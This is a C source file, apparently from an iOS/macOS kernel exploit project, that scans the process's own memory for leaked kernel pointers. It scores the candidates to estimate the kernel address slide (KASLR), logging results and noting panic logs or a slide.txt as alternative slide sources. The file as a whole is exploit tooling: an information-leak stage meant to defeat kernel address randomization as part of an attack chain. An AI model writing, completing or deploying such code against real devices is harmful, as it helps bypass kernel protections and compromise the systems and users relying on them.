#include "exploit.h"
#include <mach/mach.h>
#include <mach-o/dyld.h>

#define MAX_KERNEL_PTRS 64
static uint64_t g_kernel_ptrs[MAX_KERNEL_PTRS];
static int g_kernel_ptrs_count = 0;
int g_found_kernel_ptr = 0;
uint64_t g_best_kptr = 0;
uint64_t g_estimated_slide = 0;

static uint64_t my_own_consts[] = {
    0xFFFFFFF007004000ULL,
    0xFFFFFFF008140000ULL,
    0xFFFFFFF007BAC000ULL,
    0xFFFFFFF0080F4000ULL,
    0xFFFFFFF00AC74000ULL,
};
#define N_MY_CONSTS (sizeof(my_own_consts) / sizeof(my_own_consts[0]))

static int is_my_const(uint64_t v) {
    for (int i = 0; i < N_MY_CONSTS; i++)
        if (v == my_own_consts[i]) return 1;
    return 0;
}

static int is_kernel_va(uint64_t v) {
    uint32_t hi = (uint32_t)(v >> 32);
    return (hi == 0xfffffff0 || hi == 0xffffffe0 ||
            hi == 0xfffffe00 || hi == 0xffffff80);
}

static int is_poison(uint64_t v) {
    if (v == 0) return 1;
    uint8_t b0 = (uint8_t)(v & 0xff);
    int same = 1;
    for (int i = 1; i < 8; i++)
        if (((v >> (8*i)) & 0xff) != b0) { same = 0; break; }
    if (same) return 1;
    if (v == 0xDEADBEEFDEADBEEFULL) return 1;
    if (v == 0xAAAAAAAAAAAAAAAAULL) return 1;
    if (v == 0x5555555555555555ULL) return 1;
    if (v == 0xCDCDCDCDCDCDCDCDULL) return 1;
    if (v == 0xFDFDFDFDFDFDFDFDULL) return 1;
    if ((v & 0xFFFFFFFF) == 0xDEADBEEFULL) return 1;
    return 0;
}

static int is_in_own_binary(uint64_t addr) {
    uint32_t n_images = _dyld_image_count();
    for (uint32_t i = 0; i < n_images; i++) {
        const struct mach_header *hdr = _dyld_get_image_header(i);
        if (!hdr) continue;
        uintptr_t base = (uintptr_t)hdr;
        uintptr_t end = base + 0xA00000;
        if (addr >= base && addr < end) return 1;
    }
    return 0;
}

void nk_scan_kernel_pointers(void) {
    nk_rule();
    nk_log("[kptr] scanning process memory for kernel pointers");
    g_kernel_ptrs_count = 0;
    g_found_kernel_ptr = 0;
    g_best_kptr = 0;
    g_estimated_slide = 0;

    mach_vm_address_t addr = 0;
    int regions = 0;
    int kptr_count = 0;

    while (regions < 8192) {
        mach_vm_size_t size = 0;
        uint32_t depth = 4096;
        vm_region_submap_info_data_64_t info;
        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
        kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
            &addr, &size, &depth, (vm_region_recurse_info_t)&info, &cnt);
        if (kr != KERN_SUCCESS) break;
        regions++;

        if ((info.protection & VM_PROT_READ) && size >= 8 && size < 0x10000000) {
            size_t chunk = (size < 0x100000) ? size : 0x100000;
            void *buf = malloc(chunk);
            if (buf) {
                vm_size_t actual = chunk;
                kr = vm_read_overwrite(mach_task_self(), addr, chunk,
                    (vm_address_t)buf, &actual);
                if (kr == KERN_SUCCESS) {
                    uint64_t *p = (uint64_t *)buf;
                    size_t words = actual / 8;
                    for (size_t i = 0; i < words; i++) {
                        uint64_t v = p[i];
                        if (is_in_own_binary(addr + i * 8)) continue;
                        if (is_my_const(v)) continue;
                        if (is_kernel_va(v) && !is_poison(v)) {
                            kptr_count++;
                            if (g_kernel_ptrs_count < MAX_KERNEL_PTRS)
                                g_kernel_ptrs[g_kernel_ptrs_count++] = v;
                            nk_log("[kptr] FOUND: va=0x%016llx at region=0x%llx offset=0x%zx",
                                v, (unsigned long long)addr, i * 8);
                        }
                    }
                }
                free(buf);
            }
        }
        addr += size;
    }

    nk_log("[kptr] scan complete: %d kernel pointers found", kptr_count);

    if (kptr_count > 0) {
        g_found_kernel_ptr = 1;
        uint64_t best = 0;
        int best_score = -1;
        for (int i = 0; i < g_kernel_ptrs_count; i++) {
            uint64_t v = g_kernel_ptrs[i];
            int score = 0;
            if (v >= 0xFFFFFFF007000000ULL && v <= 0xFFFFFFF007200000ULL) score += 10;
            if (v >= 0xFFFFFFF008000000ULL && v <= 0xFFFFFFF008200000ULL) score += 8;
            if ((v & 0x3FFF) == 0) score += 5;
            if ((v & 0xFFF) == 0) score += 3;
            if ((v & 0xFF) == 0) score += 2;
            if (score > best_score) { best_score = score; best = v; }
        }
        g_best_kptr = best;
        nk_log("[kptr] best kernel pointer: 0x%016llx (score %d)", best, best_score);
        nk_log("[kptr] NOTE: slide from kptr alone is unreliable — use panic-log or slide.txt");
    } else {
        nk_log("[-] no kernel pointers found after filtering own code");
    }
    nk_rule();
}
